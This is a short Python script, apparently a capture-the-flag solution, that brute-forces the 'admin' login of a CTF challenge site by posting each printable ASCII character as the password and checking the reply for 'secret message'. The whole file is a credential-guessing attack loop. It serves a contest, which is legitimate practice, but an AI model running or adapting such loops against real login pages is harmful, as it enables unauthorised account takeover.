import itertools
import string
import requests

url = "https://entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-2f567adc1e4d.1753ctf.com/"

charset = ''.join(chr(i) for i in range(32, 127))

success_indicator = "secret message"

for combo in charset:
    password = ''.join(combo)
    
    data = {
        "username": "admin",
        "password": password
    }

    try:
        response = requests.post(url, data=data)
        
        if success_indicator in response.text:
            print(f"[✅] Password found: {password}")
            break
        else:
            print(f"[❌] Trying: {password}")

    except Exception as e:
        print(f"[⚠️] Error with {password}: {e}")
